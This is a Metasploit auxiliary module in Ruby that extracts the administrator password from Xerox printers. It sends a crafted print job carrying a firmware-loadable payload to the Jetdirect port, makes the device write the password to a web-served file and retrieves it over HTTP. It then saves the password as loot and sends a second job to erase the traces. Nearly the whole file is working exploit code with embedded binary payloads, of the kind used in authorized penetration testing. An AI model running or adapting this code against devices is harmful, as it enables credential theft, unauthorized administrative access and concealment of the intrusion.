##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Xerox Administrator Console Password Extractor',
      'Description'    => %q{
        This module will extract the management console's admin password from the
        Xerox file system using firmware bootstrap injection.
      },
      'Author'         =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptPort.new('RPORT', [true, 'Web management console port for the printer', 80]),
        OptPort.new('JPORT', [true, 'Jetdirect port', 9100]),
         OptInt.new('TIMEOUT', [true, 'Timeout to wait for printer job to run', 45])
      ])
  end

  def jport
    datastore['JPORT']
  end

  # Time to start the fun
  def run
    print_status("#{rhost}:#{jport} - Attempting to extract the web consoles admin password...")
    return unless write

    print_status("#{rhost}:#{jport} - Waiting #{datastore['TIMEOUT']} seconds...")
    sleep(datastore['TIMEOUT'])
    passwd = retrieve
    remove

    if passwd
      print_good("#{rhost}:#{jport} - Password found: #{passwd}")

      loot_name     = 'xerox.password'
      loot_type     = 'text/plain'
      loot_filename = 'xerox_password.text'
      loot_desc     = 'Xerox password harvester'
      p = store_loot(loot_name, loot_type, datastore['RHOST'], passwd, loot_filename, loot_desc)
      print_good("#{rhost}:#{jport} - Credentials saved in: #{p}")

      register_creds('Xerox-HTTP', rhost, rport, 'Admin', passwd)

    else
      print_error("#{rhost}:#{jport} - No credentials extracted")
    end
  end

  # Trigger firmware bootstrap write out password data to URL root
  def write
    print_status("#{rhost}:#{jport} - Sending print job")
    create_print_job = '%%XRXbegin' + "\x0a"
    create_print_job << '%%OID_ATT_JOB_TYPE OID_VAL_JOB_TYPE_DYNAMIC_LOADABLE_MODULE' + "\x0a"
    create_print_job << '%%OID_ATT_JOB_SCHEDULING OID_VAL_JOB_SCHEDULING_AFTER_COMPLETE' + "\x0a"
    create_print_job << '%%OID_ATT_JOB_COMMENT ""' + "\x0a"
    create_print_job << '%%OID_ATT_JOB_COMMENT "patch"' + "\x0a"
    create_print_job << '%%OID_ATT_DLM_NAME "xerox"' + "\x0a"
    create_print_job << '%%OID_ATT_DLM_VERSION "NO_DLM_VERSION_CHECK"' + "\x0a"
    create_print_job << '%%OID_ATT_DLM_SIGNATURE "8ba01980993f55f5836bcc6775e9da90bc064e608bf878eab4d2f45dc2efca09"' + "\x0a"
    create_print_job << '%%OID_ATT_DLM_EXTRACTION_CRITERIA "extract /tmp/xerox.dnld"' + "\x0a"
    create_print_job << '%%XRXend' + "\x0a\x1f\x8b"
    create_print_job << "\x08\x00\x80\xc3\xf6\x51\x00\x03\xed\xcf\x3b\x6e\xc3\x30\x0c\x06"
    create_print_job << "\x60\xcf\x39\x05\xe3\xce\x31\x25\xa7\x8e\xa7\x06\xe8\x0d\x72\x05"
    create_print_job << "\x45\x92\x1f\x43\x2d\x43\x94\x1b\x07\xc8\xe1\xab\x16\x28\xd0\xa9"
    create_print_job << "\x9d\x82\x22\xc0\xff\x0d\x24\x41\x72\x20\x57\x1f\xc3\x5a\xc9\x50"
    create_print_job << "\xdc\x91\xca\xda\xb6\xf9\xcc\xba\x6d\xd4\xcf\xfc\xa5\x56\xaa\xd0"
    create_print_job << "\x75\x6e\x35\xcf\xba\xd9\xe7\xbe\xd6\x07\xb5\x2f\x48\xdd\xf3\xa8"
    create_print_job << "\x6f\x8b\x24\x13\x89\x8a\xd9\x47\xbb\xfe\xb2\xf7\xd7\xfc\x41\x3d"
    create_print_job << "\x6d\xf9\x3c\x4e\x7c\x36\x32\x6c\xac\x49\xc4\xef\x26\x72\x98\x13"
    create_print_job << "\x4f\x96\x6d\x98\xba\xb1\x67\xf1\x76\x89\x63\xba\x56\xb6\xeb\xe9"
    create_print_job << "\xd6\x47\x3f\x53\x29\x57\x79\x75\x6f\xe3\x74\x32\x22\x97\x10\x1d"
    create_print_job << "\xbd\x94\x74\xb3\x4b\xa2\x9d\x2b\x73\xb9\xeb\x6a\x3a\x1e\x89\x17"
    create_print_job << "\x89\x2c\x83\x89\x9e\x87\x94\x66\x97\xa3\x0b\x56\xf8\x14\x8d\x77"
    create_print_job << "\xa6\x4a\x6b\xda\xfc\xf7\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    create_print_job << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8f\xea\x03\x34\x66\x0b\xc1"
    create_print_job << "\x00\x28\x00\x00"

    begin
      connect(true, 'RPORT' => jport)
      sock.put(create_print_job)
    rescue ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout
      print_error("#{rhost}:#{jport} - Error connecting to #{rhost}")
    ensure
      disconnect
    end
  end

  def retrieve
    print_status("#{rhost}:#{jport} - Retrieving password from #{rhost}")
    request = "GET /Praeda.txt HTTP/1.0\r\n\r\n"

    begin
      connect
      sock.put(request)
      res = sock.get_once || ''
      passwd = res.match(/\r\n\s(.+?)\n/)
      return passwd ? passwd[1] : ''
    rescue ::EOFError, ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout, ::EOFError
      print_error("#{rhost}:#{jport} - Error getting password from #{rhost}")
      return
    ensure
      disconnect
    end
  end

  # Trigger firmware bootstrap to delete the trace files and praeda.txt file from URL
  def remove
    print_status("#{rhost}:#{jport} - Removing print job")
    remove_print_job = '%%XRXbegin' + "\x0A"
    remove_print_job << '%%OID_ATT_JOB_TYPE OID_VAL_JOB_TYPE_DYNAMIC_LOADABLE_MODULE' + "\x0A"
    remove_print_job << '%%OID_ATT_JOB_SCHEDULING OID_VAL_JOB_SCHEDULING_AFTER_COMPLETE' + "\x0A"
    remove_print_job << '%%OID_ATT_JOB_COMMENT ""' + "\x0A"
    remove_print_job << '%%OID_ATT_JOB_COMMENT "patch"' + "\x0A"
    remove_print_job << '%%OID_ATT_DLM_NAME "xerox"' + "\x0A"
    remove_print_job << '%%OID_ATT_DLM_VERSION "NO_DLM_VERSION_CHECK"' + "\x0A"
    remove_print_job << '%%OID_ATT_DLM_SIGNATURE "8b5d8c631ec21068211840697e332fbf719e6113bbcd8733c2fe9653b3d15491"' + "\x0A"
    remove_print_job << '%%OID_ATT_DLM_EXTRACTION_CRITERIA "extract /tmp/xerox.dnld"' + "\x0A"
    remove_print_job << '%%XRXend' + "\x0a\x1f\x8b"
    remove_print_job << "\x08\x00\x5d\xc5\xf6\x51\x00\x03\xed\xd2\xcd\x0a\xc2\x30\x0c\xc0"
    remove_print_job << "\xf1\x9e\x7d\x8a\x89\x77\xd3\x6e\xd6\xbd\x86\xaf\x50\xb7\xc1\x04"
    remove_print_job << "\xf7\x41\xdb\x41\x1f\xdf\x6d\x22\x78\xd2\x93\x88\xf8\xff\x41\x92"
    remove_print_job << "\x43\x72\x48\x20\xa9\xf1\x43\xda\x87\x56\x7d\x90\x9e\x95\xa5\x5d"
    remove_print_job << "\xaa\x29\xad\x7e\xae\x2b\x93\x1b\x35\x47\x69\xed\x21\x2f\x0a\xa3"
    remove_print_job << "\xb4\x31\x47\x6d\x55\xa6\x3f\xb9\xd4\xc3\x14\xa2\xf3\x59\xa6\xc6"
    remove_print_job << "\xc6\x57\xe9\xc5\xdc\xbb\xfe\x8f\xda\x6d\xe5\x7c\xe9\xe5\xec\x42"
    remove_print_job << "\xbb\xf1\x5d\x26\x53\xf0\x12\x5a\xe7\x1b\x69\x63\x1c\xeb\x39\xd7"
    remove_print_job << "\x43\x15\xe4\xe4\x5d\x53\xbb\x7d\x4c\x71\x9d\x1a\xc6\x28\x7d\x25"
    remove_print_job << "\xf5\xb5\x0b\x92\x96\x0f\xba\xe7\xf9\x8f\x36\xdf\x3e\x08\x00\x00"
    remove_print_job << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\xc4\x0d\x40\x0a"
    remove_print_job << "\x75\xe1\x00\x28\x00\x00"

    begin
      connect(true, 'RPORT' => jport)
      sock.put(remove_print_job)
    rescue ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout
      print_error("#{rhost}:#{jport} - Error removing print job from #{rhost}")
    ensure
      disconnect
    end
  end

  def register_creds(service_name, remote_host, remote_port, username, password)
    credential_data = {
      origin_type: :service,
      module_fullname: self.fullname,
      workspace_id: myworkspace.id,
      private_data: password,
      private_type: :password,
      username: username
    }

    service_data = {
      address: remote_host,
      port: remote_port,
      service_name: service_name,
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED,
      workspace_id: myworkspace_id
    }

    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end
